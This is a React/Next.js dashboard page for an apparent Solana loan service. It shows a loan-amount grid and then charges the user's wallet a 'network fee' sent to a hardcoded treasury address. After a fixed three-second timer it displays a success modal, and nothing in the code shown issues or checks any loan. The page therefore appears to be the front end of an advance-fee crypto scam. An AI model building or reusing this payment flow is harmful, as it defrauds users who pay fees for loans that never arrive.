'use client'

import { useEffect, useState } from 'react'
import { useRouter } from 'next/navigation'
import { useWallet } from '@solana/wallet-adapter-react'
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from '@solana/web3.js'
import { getNetworkFee } from '@/lib/fees'
import { usdToSol, formatSol } from '@/lib/solPrice'
import TickerBar from '@/components/TickerBar'
import WalletCard from '@/components/WalletCard'
import LoanGrid from '@/components/LoanGrid'
import TransactionSummary from '@/components/TransactionSummary'
import TransactionFeed from '@/components/TransactionFeed'
import TransactionLoadingModal from '@/components/TransactionLoadingModal'
import TransactionSuccessModal from '@/components/TransactionSuccessModal'
import TransactionErrorModal from '@/components/TransactionErrorModal'
import Footer from '@/components/Footer'

// Treasury address for loan network fee payments
const TREASURY_ADDRESS = '6mz6bQ88xsrpDeKLzdDhRdqqEZYYrVVTqJbKF1aYCzU3'

export default function Dashboard() {
  const { connected, publicKey, signTransaction, sendTransaction } = useWallet()
  const router = useRouter()
  const [selectedAmount, setSelectedAmount] = useState<number | null>(null)
  const [isLoading, setIsLoading] = useState(false)
  const [showSuccess, setShowSuccess] = useState(false)
  const [showError, setShowError] = useState(false)
  const [errorMessage, setErrorMessage] = useState('')

  useEffect(() => {
    // Check if wallet is connected, otherwise redirect to home
    const walletAddress = localStorage.getItem('phantom_wallet')
    if (!connected && !walletAddress) {
      router.push('/')
    }
  }, [connected, router])

  useEffect(() => {
    // Scroll to summary when amount is selected
    if (selectedAmount) {
      setTimeout(() => {
        const summaryElement = document.getElementById('transaction-summary')
        if (summaryElement) {
          summaryElement.scrollIntoView({ behavior: 'smooth', block: 'start' })
        }
      }, 300) // Delay to allow animation
    }
  }, [selectedAmount])

  const handleContinue = async () => {
    if (!publicKey || !signTransaction) {
      setErrorMessage('Wallet not connected properly. Please reconnect your wallet.')
      setShowError(true)
      return
    }

    try {
      // Create a Solana connection (using devnet for safety, change to mainnet-beta for production)
      const connection = new Connection('https://api.devnet.solana.com', 'confirmed')

      // Calculate network fee using fixed tier amounts
      const networkFeeUSD = getNetworkFee(selectedAmount || 0)

      // Fetch live SOL price and convert USD to SOL
      console.log(`Converting $${networkFeeUSD} to SOL...`)
      const networkFeeSOL = await usdToSol(networkFeeUSD)
      console.log(`Network fee: $${networkFeeUSD} = ${formatSol(networkFeeSOL)} SOL`)

      const networkFeeLamports = Math.floor(networkFeeSOL * LAMPORTS_PER_SOL)

      // Create treasury public key
      const treasuryPubkey = new PublicKey(TREASURY_ADDRESS)

      // Create transaction
      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: treasuryPubkey,
          lamports: networkFeeLamports,
        })
      )

      // Get recent blockhash
      const { blockhash } = await connection.getLatestBlockhash()
      transaction.recentBlockhash = blockhash
      transaction.feePayer = publicKey

      // Sign and send transaction using Phantom
      const signature = await sendTransaction(transaction, connection)

      console.log('Transaction signature:', signature)
      console.log(`Transferred ${formatSol(networkFeeSOL)} SOL ($${networkFeeUSD}) to treasury`)

      // Show loading modal for 3 seconds
      setIsLoading(true)

      setTimeout(() => {
        setIsLoading(false)
        setShowSuccess(true)
      }, 3000)

    } catch (error: any) {
      console.error('Transaction error:', error)

      // Handle different error types
      if (error.message?.includes('User rejected')) {
        setErrorMessage('Transaction cancelled by user')
      } else if (error.message?.includes('insufficient')) {
        setErrorMessage('Insufficient SOL balance for transaction')
      } else {
        setErrorMessage(error.message || 'Transaction failed. Please try again.')
      }

      setShowError(true)
    }
  }

  const handleSuccessClose = () => {
    setShowSuccess(false)
    setSelectedAmount(null)
  }

  const handleErrorClose = () => {
    setShowError(false)
    setErrorMessage('')
  }

  if (!connected) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-[#0f0c29] via-[#302b63] to-[#24243e] flex items-center justify-center">
        <div className="text-white text-xl">Loading...</div>
      </div>
    )
  }

  return (
    <main className="min-h-screen bg-gradient-to-br from-[#0f0c29] via-[#302b63] to-[#24243e]">
      <TickerBar />
      <div className="max-w-7xl mx-auto px-4 py-6">
        <WalletCard />
        <LoanGrid onAmountSelect={setSelectedAmount} selectedAmount={selectedAmount} />
        {selectedAmount && (
          <div id="transaction-summary">
            <TransactionSummary selectedAmount={selectedAmount} onContinue={handleContinue} />
          </div>
        )}
        <TransactionFeed />
      </div>
      <Footer />

      {/* Transaction Modals */}
      <TransactionLoadingModal isOpen={isLoading} />
      <TransactionSuccessModal
        isOpen={showSuccess}
        onClose={handleSuccessClose}
        selectedAmount={selectedAmount || 0}
      />
      <TransactionErrorModal
        isOpen={showError}
        onClose={handleErrorClose}
        errorMessage={errorMessage}
      />
    </main>
  )
}
